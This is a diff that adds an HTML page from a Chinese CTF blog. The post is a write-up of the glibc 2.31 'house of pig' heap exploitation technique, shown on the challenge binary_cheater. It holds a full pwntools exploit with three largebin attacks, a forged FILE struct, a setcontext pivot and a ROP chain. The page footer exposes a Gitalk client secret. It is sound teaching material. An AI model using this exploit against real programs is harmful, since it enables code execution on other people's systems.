@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>house_of_pig - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="2.31house of pig的一种打法 以2021国赛final day2 binary_cheater为例">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_pig">
+<meta property="og:url" content="http://shiroinu.top/2021/11/15/house-of-pig/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="2.31house of pig的一种打法 以2021国赛final day2 binary_cheater为例">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-11-15T15:02:56.686Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house_of_pig">
+<meta name="twitter:description" content="2.31house of pig的一种打法 以2021国赛final day2 binary_cheater为例">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1637381239086">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>32</div>
+        <div><span>标签</span>3</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/others/" style="font-size: 10px;">others</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>house_of_pig</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年11月15日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.6k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 9 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>2.31house of pig的一种打法 以2021国赛final day2 binary_cheater为例</p>
+<a id="more"></a>
+
+<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><p>存在UAF</p>
+<h2 id="对应题目要素"><a href="#对应题目要素" class="headerlink" title="对应题目要素"></a>对应题目要素</h2><ul>
+<li>使用calloc</li>
+<li>size限制&gt;0x400</li>
+<li>通过函数检测置0等手段禁用free_hook和malloc_hook(可绕过)</li>
+<li>但2.34以后没有hook因此无法使用</li>
+</ul>
+<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><ul>
+<li>泄露heap和libc</li>
+<li>三次largebin attack 写三个堆地址</li>
+</ul>
+<ol>
+<li>攻击tls.tcache指针 用于_IO_str_overflow时malloc出free_hook<ul>
+<li>可通过Pwngdb的tls查找tls的地址</li>
+</ul>
+</li>
+<li>攻击stderr指针 用于控制fflush(stderr)的执行流</li>
+<li>攻击main_arena.topchunk 用于触发fflush</li>
+</ol>
+<ul>
+<li>malloc_printerr在2.29以后不再触发fsop</li>
+<li>topchunk如果size不对齐则会触发assert进而fsop<pre><code class="c">assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
+        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
+         prev_inuse (old_top) &amp;&amp;
+         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</code></pre>
+</li>
+<li>如果存在方便触发FSOP的方法(exit/main返回)则不需要打topchunk,直接exit触发fflush即可</li>
+</ul>
+<p>在三次largebin attack后,这三个地址中的指针都为同一个堆块<br>然后伪造该堆块为一个file结构体,同时作为tcache堆块在相应的偏移放上count和ptr</p>
+<ul>
+<li>最后伪造<code>vtable为_IO_str_jumps - 0x20</code> malloc时触发<code>__malloc_assert</code>即可进入流程<h2 id="代码细节"><a href="#代码细节" class="headerlink" title="代码细节"></a>代码细节</h2><h3 id="tcache伪造"><a href="#tcache伪造" class="headerlink" title="tcache伪造"></a>tcache伪造</h3><pre><code class="python">size = (0x380 - 100)//2 
+chunk_size = 0x380+0x10
+tcache_base = heap_base + 0xb30
+TCAHCE_MAX_BINS = 64
+count_size = TCAHCE_MAX_BINS * 2
+tcache_ptr_addr = tcache_base + count_size + 8 * ((chunk_size - 0x20) // 0x10)
+size_addr = tcache_base + 2 * ((chunk_size - 0x20) // 0x10)
+log.info(hex(tcache_ptr_addr))
+log.info(hex(size_addr))</code></pre>
+</li>
+</ul>
+<ol>
+<li><p>size/chunk_size<br>size是IO_str_overflow中malloc的size</p>
+<pre><code class="c">size_t new_size = 2 * old_blen + 100;</code></pre>
+<p>加上chunk头0x10再计算偏移</p>
+</li>
+<li><p>count_size/tcache_ptr/size_addr</p>
+<pre><code class="c">typedef struct tcache_perthread_struct
+{
+uint16_t counts[TCACHE_MAX_BINS];
+tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;</code></pre>
+<p>tcache最小size = 0x20 然后每增加0x10对应一个entry</p>
+</li>
+</ol>
+<h3 id="file伪造"><a href="#file伪造" class="headerlink" title="file伪造"></a>file伪造</h3><ul>
+<li>_IO_str_overflow</li>
+</ul>
+<p>GLIBC2.31/libioP.c:536</p>
+<pre><code class="c">#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code></pre>
+<p>GLIBC2.31/strops.c:98<br>_IO_str_overflow</p>
+<pre><code class="c">    else
+    {
+    char *new_buf;
+    char *old_buf = fp-&gt;_IO_buf_base;
+    size_t old_blen = _IO_blen (fp);
+    size_t new_size = 2 * old_blen + 100; 
+    if (new_size &lt; old_blen)
+        return EOF;
+    new_buf = malloc (new_size);
+    if (new_buf == NULL)
+        {
+        /*      __ferror(fp) = 1; */
+        return EOF;
+        }
+    if (old_buf)
+        {
+        memcpy (new_buf, old_buf, old_blen);
+        free (old_buf);
+        /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */
+        fp-&gt;_IO_buf_base = NULL;
+        }</code></pre>
+<pre><code class="python">fake_file=p64(0)               #_flags
+fake_file+=p64(0)             #_IO_read_ptr
+fake_file+=p64(0)             #_IO_read_end
+fake_file+=p64(0)             #_IO_read_base
+fake_file+=p64(1)             #_IO_write_base
+fake_file+=p64(0xffffffffffff)             #_IO_write_ptr
+fake_file+=p64(0)         #_IO_write_end
+fake_file+=p64(heap_base + 0xb30 + 0xe0)                    #_IO_buf_base
+fake_file+=p64(heap_base + 0xb30 + 0xe0 + size)                    #_IO_buf_end
+fake_file+=p64(0)                       #_IO_save_base
+fake_file+=p64(0)                       #_IO_backup_base 
+fake_file+=p64(0)                       #_IO_save_end
+fake_file+=p16(0) *4                       #_markers
+fake_file+=p16(0) *3 + p16(7)                       #chain   could be a anathor file struct
+# fake_file+=p16(0) *4                       #chain   could be a anathor file struct
+
+fake_file+=p32(0)                       #_fileno
+fake_file+=p32(0)                       #_flags2
+fake_file+=p64(0)      #_old_offset
+fake_file+=p16(0)                       #_cur_column
+fake_file+=p8(0)                        #_vtable_offset
+fake_file+=p8(0)                      #_shortbuf
+fake_file+=p32(0)
+fake_file+=p64(libc_base + 0x1E66A0)                    #_lock   _IO_flockfile (fp);
+fake_file+=p64(0)      #_offset
+fake_file+=p64(0)                       #_codecvt
+fake_file+=p64(0)                    #_wide_data
+fake_file+=p64(0)                       #_freeres_list
+fake_file+=p64(0)                       #_freeres_buf
+fake_file+=p64(0)                       #__pad5
+fake_file+=p32(0)              #_mode
+fake_file+=p32(0)                       #unused2
+fake_file+=p64(0)*2                     #unused2
+fake_file+=p64(libc_base + 0x1E5580 - 0x20)      # IO_str_jumps - 0x20 IO__xsputn &lt;-&gt; _IO_str_overflow
+payload = fake_file[0x10:] + p64(rdx_gadget) + p64(libc_base + libc.symbols[&#39;__free_hook&#39;] + 0x10) + p64(0) * 4 + p64(libc_base + libc.symbols[&#39;setcontext&#39;] + 61) + bytes(frame)[0x28:]
+payload += b&#39;./flag.txt\x00\x00\x00\x00\x00\x00&#39; + p64(0) * (4+4) +p64(libc_base + libc.symbols[&#39;__free_hook&#39;]) * (0x10-5)+ rop
+</code></pre>
+<ol>
+<li><p>_IO_buf_base为开始memcpy的地址,即p64(rdx_gadget)所存放的地址</p>
+</li>
+<li><p>_IO_buf_end - _IO_buf_base = old_blen , size已在之前算出</p>
+</li>
+<li><p>_lock 需要为原函数指针,因为<code>malloc_assert</code>一路调用会调用<code>__vfxprintf</code><br>fxprintf.c:77</p>
+<pre><code class="c">int
+__vfxprintf (FILE *fp, const char *fmt, va_list ap,
+      unsigned int mode_flags)
+{
+if (fp == NULL)
+ fp = stderr;
+_IO_flockfile (fp);
+int res = locked_vfxprintf (fp, fmt, ap, mode_flags);
+_IO_funlockfile (fp);
+return res;
+}</code></pre>
+</li>
+<li><p>vtable需要伪造为<code>IO_str_jumps - 0x20</code>,0x20的偏移来自于<code>vfprintf</code>会调用<code>outstring</code>来输出,最终调用的就是<code>_IO_sputn</code>,和<code>__overflow</code>的偏移为0x20</p>
+</li>
+</ol>
+<pre><code class="c"># define PUT(F, S, N)    _IO_sputn ((F), (S), (N))</code></pre>
+<pre><code class="c">#define outstring(String, Len)                              \
+  do                                          \
+    {                                          \
+      assert ((size_t) done &lt;= (size_t) INT_MAX);                  \
+      if ((size_t) PUT (s, (String), (Len)) != (size_t) (Len))              \
+    {                                      \
+      done = -1;                                  \
+      goto all_done;                              \
+    }                                      \
+      if (__glibc_unlikely (INT_MAX - done &lt; (Len)))                  \
+      {                                          \
+    done = -1;                                  \
+     __set_errno (EOVERFLOW);                          \
+    goto all_done;                                  \
+      }                                          \
+      done += (Len);                                  \
+    }                                          \
+  while (0)</code></pre>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context.log_level= &#39;DEBUG&#39;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+def add(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&quot;Size: &quot;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Content: &#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+
+
+def delete(index):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&quot;Index: &quot;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+
+def edit(index, content):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&quot;Index: &quot;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;Content: &#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+
+
+def show(index):
+    sh.sendline(&#39;4&#39;)
+    sh.recvuntil(&quot;Index: &quot;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;Content: &#39;)
+    data = sh.recv(6)
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+    return data
+
+sh = process(&quot;./binaryc&quot;)
+
+# sh = remote(&#39;10.1.151.11&#39;,10003)
+add(0x410,&#39;a&#39;)#0
+add(0x450,&#39;a&#39;)
+add(0x420,&#39;a&#39;) #2 fake b30
+add(0x450,&#39;a&#39;) #3
+delete(0)
+delete(2)
+add(0x450,&#39;a&#39;) #4
+libc_base = u64(show(0).ljust(8,b&#39;\x00&#39;)) - 0x1E3FF0
+heap_base = u64(show(2).ljust(8,b&#39;\x00&#39;)) - 0x2b0
+log.success(&quot;libc_base = &quot; + hex(libc_base))
+log.success(&quot;heap_base = &quot; + hex(heap_base))
+add(0x410,&#39;a&#39;) #5
+add(0x420,&#39;a&#39;) #6
+
+delete(6)
+add(0x450,&#39;a&#39;) #7
+delete(5)
+
+
+large_payload = p64(libc_base + 0x1E3FF0) * 2 + p64(heap_base + 0xb30)
+
+edit(6,large_payload + p64(libc_base + libc.symbols[&#39;stderr&#39;] - 0x20))
+add(0x450,&#39;a&#39;) #8 largebin_attack_1 -&gt; stderr = 5
+
+add(0x410,&#39;a&#39;) #9
+delete(9)
+
+edit(6,large_payload + p64(libc_base + 0x1EB538 - 0x20)) #use Pwngdb tls command
+add(0x450,&#39;a&#39;) #10  largebin_attack_2 -&gt; tls.tcache struct
+add(0x410,&#39;a&#39;) #11
+delete(11)
+delete(4)
+edit(6,large_payload + p64(libc_base + 0x1E3C00 - 0x20))
+# delete(10)
+add(0x450,&#39;a&#39;) #12 largebin_attack_3 -&gt; topchunk 
+# add(0x410,&#39;a&#39;) #11
+rdx_gadget = 0x000000000014b760 + libc_base
+rdi_ret = 0x000000000002858f + libc_base 
+rsi_ret = 0x000000000002ac3f + libc_base
+rdx_r12_ret = 0x0000000000114161 + libc_base
+ret = 0x0000000000026699 + libc_base
+syscall = 0x00000000000611ea + libc_base
+rax_ret = 0x0000000000045580 + libc_base
+
+size = (0x380 - 100)//2
+chunk_size = 0x380+0x10
+tcache_base = heap_base + 0xb30
+TCAHCE_MAX_BINS = 64
+count_size = TCAHCE_MAX_BINS * 2
+tcache_ptr_addr = tcache_base + count_size + 8 * ((chunk_size - 0x20) // 0x10)
+size_addr = tcache_base + 2 * ((chunk_size - 0x20) // 0x10)
+log.info(hex(tcache_ptr_addr))
+log.info(hex(size_addr))
+frame = SigreturnFrame()
+frame.rsp = heap_base + 0xd40  + 0x80#todo
+frame.rip = ret
+flag_addr = heap_base + 0xd18  #todo
+buf_addr = heap_base + 0x100
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base + libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base +libc.symbols[&#39;write&#39;])
+
+fake_file=p64(0)               #_flags
+fake_file+=p64(0)             #_IO_read_ptr
+fake_file+=p64(0)             #_IO_read_end
+fake_file+=p64(0)             #_IO_read_base
+fake_file+=p64(1)             #_IO_write_base
+fake_file+=p64(0xffffffffffff)             #_IO_write_ptr
+fake_file+=p64(0)         #_IO_write_end
+fake_file+=p64(heap_base + 0xb30 + 0xe0)                    #_IO_buf_base
+fake_file+=p64(heap_base + 0xb30 + 0xe0 + size)                    #_IO_buf_end 0x18 * 2 + 100 = 0x94
+fake_file+=p64(0)                       #_IO_save_base
+fake_file+=p64(0)                       #_IO_backup_base 
+fake_file+=p64(0)                       #_IO_save_end
+fake_file+=p16(0) *4                       #_markers
+fake_file+=p16(0) *3 + p16(7)                       #chain   could be a anathor file struct
+# fake_file+=p16(0) *4                       #chain   could be a anathor file struct
+
+fake_file+=p32(0)                       #_fileno
+fake_file+=p32(0)                       #_flags2
+fake_file+=p64(0)      #_old_offset
+fake_file+=p16(0)                       #_cur_column
+fake_file+=p8(0)                        #_vtable_offset
+fake_file+=p8(0)                      #_shortbuf
+fake_file+=p32(0)
+fake_file+=p64(libc_base + 0x1E66A0)                    #_lock   _IO_flockfile (fp);
+fake_file+=p64(0)      #_offset
+fake_file+=p64(0)                       #_codecvt
+fake_file+=p64(0)                    #_wide_data
+fake_file+=p64(0)                       #_freeres_list
+fake_file+=p64(0)                       #_freeres_buf
+fake_file+=p64(0)                       #__pad5
+fake_file+=p32(0)              #_mode
+fake_file+=p32(0)                       #unused2
+fake_file+=p64(0)*2                     #unused2
+fake_file+=p64(libc_base + 0x1E5580 - 0x20)                       #
+payload = fake_file[0x10:] + p64(rdx_gadget) + p64(libc_base + libc.symbols[&#39;__free_hook&#39;] + 0x10) + p64(0) * 4 + p64(libc_base + libc.symbols[&#39;setcontext&#39;] + 61) + bytes(frame)[0x28:]
+# payload += b&#39;./flag.txt\x00\x00\x00\x00\x00\x00&#39; + p64(0) * (4+4) +p64(libc_base + libc.symbols[&#39;__free_hook&#39;]) * (0x10-5)+ rop
+payload += b&#39;./flag.txt\x00\x00\x00\x00\x00\x00&#39; + p64(0) * (4+4) +p64(libc_base + libc.symbols[&#39;__free_hook&#39;]) + p64(0) * (0x10-5 - 1 )+ rop
+
+gdb.attach(sh,&#39;b * $rebase(0x2BF9)&#39;)
+
+edit(2,payload)
+log.success(hex(len(payload)))
+sh.sendline(&#39;1&#39;)
+sh.sendline(&#39;1104&#39;)
+sh.interactive()
+</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1637381239104"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
